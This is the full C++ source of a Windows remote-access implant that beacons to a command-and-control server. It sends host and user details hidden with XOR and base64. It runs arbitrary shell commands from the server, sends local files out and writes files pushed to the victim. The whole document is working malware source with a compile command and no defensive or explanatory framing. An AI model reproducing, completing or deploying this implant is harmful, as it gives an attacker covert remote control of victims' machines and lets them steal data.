// compile with x86_64-w64-mingw32-g++ -o agent.exe http_agent.cpp -lwininet -lpsapi -static
#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <cstdio>
#include <sstream>
#include <vector>
#include <fstream>
#include <algorithm>
#define UNLEN 127
#include <psapi.h>
#include <exception>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "psapi.lib")


const std::string XOR_KEY = "mysecretkey";
const std::string volchock_server = "127.0.0.1";
const int volchock_port = 8080;
const std::string user_agent = "Mozilla/5.0";
const std::string header = "Accept: application/json\r\n";
const std::string results_path = "/api";
const int beacon_interval = 5;



static const std::string b64_chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789+/";

std::string base64_encode(const std::string &in) {
    std::string out;
    int val=0, valb=-6;
    for (uint8_t c : in) {
        val = (val<<8) + c;
        valb += 8;
        while (valb>=0) {
            out.push_back(b64_chars[(val>>valb)&0x3F]);
            valb-=6;
        }
    }
    if (valb>-6) out.push_back(b64_chars[((val<<8)>>(valb+8))&0x3F]);
    while (out.size()%4) out.push_back('=');
    return out;
}
std::string base64_decode(const std::string &in) {
    std::vector<int> T(256,-1);
    for (int i=0; i<64; i++) T[b64_chars[i]] = i;
    std::string out;
    int val=0, valb=-8;
    for (uint8_t c : in) {
        if (T[c] == -1) continue;
        val = (val<<6) + T[c];
        valb += 6;
        if (valb>=0) {
            out.push_back(char((val>>valb)&0xFF));
            valb-=8;
        }
    }
    return out;
}

std::string xor_data(const std::string &data, const std::string &key) {
    std::string out = data;
    size_t klen = key.length();
    for (size_t i = 0; i < out.size(); ++i)
        out[i] ^= key[i % klen];
    return out;
}

std::string get_hostname() {
    char hostname[MAX_PATH] = { 0 };
    DWORD size = sizeof(hostname);
    if (GetComputerNameA(hostname, &size))
        return hostname;
    return "unknown_host";
}

std::string get_username() {
    char username[UNLEN + 1] = { 0 };
    DWORD size = UNLEN + 1;
    if (GetUserNameA(username, &size))
        return username;
    return "unknown_user";
}

std::string get_process_name() {
    char proc_name[MAX_PATH] = { 0 };
    if (GetModuleFileNameA(NULL, proc_name, MAX_PATH)) {
        std::string s(proc_name);
        size_t pos = s.find_last_of("\\/");
        if (pos != std::string::npos) return s.substr(pos + 1);
        return s;
    }
    return "unknown_process";
}

std::string generate_agent_id() {
    return get_hostname() + "_" + get_username() + "_" + get_process_name();
}

void wininet_error(const char* msg) {
    DWORD err = GetLastError();
    std::cout << "[!] " << msg << " (GetLastError=" << err << ")" << std::endl;
}


std::vector<unsigned char> read_file_bin(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary);
    if(!file) return {};
    std::vector<unsigned char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    return buffer;
}

std::string exec_cmd(const std::string& cmd) {
    std::string result;
    char buffer[512];
    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) return "Error opening pipe";
    while (fgets(buffer, sizeof(buffer), pipe) != NULL)
        result += buffer;
    _pclose(pipe);
    return result;
}

std::string handle_download(const std::string& filepath) {
    auto data = read_file_bin(filepath);
    if(data.empty()) {
        return "[ERROR] File not found or cannot read.";
    }
    std::string encoded_file = base64_encode( base64_encode(std::string(data.begin(), data.end())) );
    return encoded_file;
}


std::string get_filename(std::string data) {
    const std::string key = "'filename':";
    size_t pos = data.find(key);
    pos += key.length();
    pos = data.find('\'', pos);
    pos++;
    size_t fin = data.find('\'', pos);
    return data.substr(pos, fin - pos);
}

std::string get_filecontent(std::string data) {
    const std::string key = "'content':";
    size_t pos = data.find(key);
    pos += key.length();
    pos = data.find('\'', pos);
    pos++;
    size_t fin = data.find('\'', pos);
    return data.substr(pos, fin - pos);
}

std::string save_base64_file(const std::string& filename, const std::string& b64_encoded_filecontent) {
    std::string decoded = base64_decode(b64_encoded_filecontent);
    std::ofstream outfile(filename.c_str(), std::ios::binary);
    if(outfile) {
        outfile.write(decoded.data(), decoded.size());
        outfile.close();
        return "File uploaded.";
    } else {
        return "File not uploaded.";
    }
}


std::string handle_upload(std::string data) {
    std::string file_props = base64_decode(data);
    std::string filename = get_filename(file_props);
    std::string b64_encoded_filecontent = get_filecontent(file_props);

    return save_base64_file(filename, b64_encoded_filecontent);

}



std::string get_task_content(const std::string& json) {
    std::string key = "\"task\":\"";
    size_t start = json.find(key);
    if (start == std::string::npos) return "";
    start += key.length();
    size_t end = json.find("\"", start);
    if (end == std::string::npos) return "";
    return json.substr(start, end - start);
}

void parse_type_and_value(const std::string& task, std::string& type, std::string& value) {
    // parsing {'TYPE': 'VALUE'}
    size_t sep1 = task.find('\'');
    if(sep1 == std::string::npos) return;
    size_t sep2 = task.find('\'', sep1+1);
    if(sep2 == std::string::npos) return;
    type = task.substr(sep1+1, sep2-sep1-1);
    size_t sep3 = task.find('\'', sep2+1);
    if(sep3 == std::string::npos) return;
    size_t sep4 = task.find('\'', sep3+1);
    if(sep4 == std::string::npos) return;
    value = task.substr(sep3+1, sep4-sep3-1);
}


std::string parse_task(std::string b64_encoded_task) {
    std::string xored_task = base64_decode(b64_encoded_task);
    std::string clear_task = xor_data(xored_task, XOR_KEY);
    std::string task = get_task_content(clear_task);
    std::string type, data;
    parse_type_and_value(task, type, data);

    if (type == "cmd") {
        std::string data_res = exec_cmd(data);
        return base64_encode(data_res);
    } else if (type == "download") {
        return handle_download(data);
    } else if (type == "upload") {
        return handle_upload(data);
    }
    return "";
}



std::string http_post(const std::string& hostname, int port, const std::string& path, const std::string& user_agent, const std::string& extra_headers, const std::string& data) {
    HINTERNET hInternet = InternetOpenA(user_agent.c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) { wininet_error("InternetOpenA failed"); return ""; }
    HINTERNET hConnect = InternetConnectA(hInternet, hostname.c_str(), port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { wininet_error("InternetConnectA failed"); InternetCloseHandle(hInternet); return ""; }
    const char *acceptTypes[] = {"*/*", NULL};
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path.c_str(), NULL, NULL, acceptTypes, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hRequest) { wininet_error("HttpOpenRequestA failed (POST)"); InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return ""; }
    std::string headers = extra_headers + "\r\nContent-Type: application/json\r\n";
    BOOL res = HttpSendRequestA(hRequest, headers.c_str(), headers.length(), (LPVOID)data.c_str(), data.length());
    if (!res) { wininet_error("HttpSendRequestA failed (POST)"); InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return ""; }
    // get response
    char buffer[4096];
    DWORD bytesRead = 0;
    std::string result;
    while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead != 0) {
        buffer[bytesRead] = 0; // Null-terminate
        result += buffer;
    }
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return result;
}



std::string beakon(std::string data_res){
    std::string agent_id = generate_agent_id();
    std::string hostname = get_hostname();
    std::string username = get_username();
    std::string process_name = get_process_name();
    std::ostringstream ss;
    ss << "{";
    ss << "\"agent_id\":\"" << agent_id << "\",";
    ss << "\"hostname\":\"" << hostname << "\",";
    ss << "\"username\":\"" << username << "\",";
    ss << "\"process_name\":\"" << process_name << "\",";
    ss << "\"results\":\"" << data_res << "\"";
    ss << "}";
    std::string result_json = ss.str();
    std::string encoded = xor_data(result_json, XOR_KEY);
    std::string b64_encoded = base64_encode(encoded);
    std::string res = http_post(volchock_server, volchock_port, results_path, user_agent, header, b64_encoded);
    return res;
}


int main() {
    std::setvbuf(stdout, NULL, _IONBF, 0);
    std::string register_call = beakon("");
    std::string result;
    while(true){
        std::this_thread::sleep_for(std::chrono::seconds(beacon_interval));
        std::string beakon_call = beakon(result);
        result = parse_task(beakon_call);
    }    
    return 0;
}
